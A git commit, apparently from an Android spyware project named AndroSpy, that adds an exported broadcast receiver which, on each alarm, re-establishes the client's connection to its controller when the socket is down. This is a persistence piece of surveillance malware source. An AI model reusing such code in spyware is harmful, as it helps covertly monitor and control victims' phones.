7ae28673890ad877b06474518e38e3adcfb9fdd1
qH0sT <asuslaptop230@gmail.com>
2021-02-01 09:20:07 +0300

    AndroSpy V3 - Fusion Edition

---
+++ Client/Alarm.cs
@@ -0,0 +1,16 @@
+﻿using Android.Content;
+
+namespace Task2
+{
+    [BroadcastReceiver(Exported = true)]
+    class Alarm : BroadcastReceiver
+    {
+        public override void OnReceive(Context context, Intent intent)
+        {
+            if (MainActivity.mySocketConnected == false)
+            {
+                ((MainActivity)MainActivity.global_activity).Baglanti_Kur();
+            }
+        }
+    }
+}
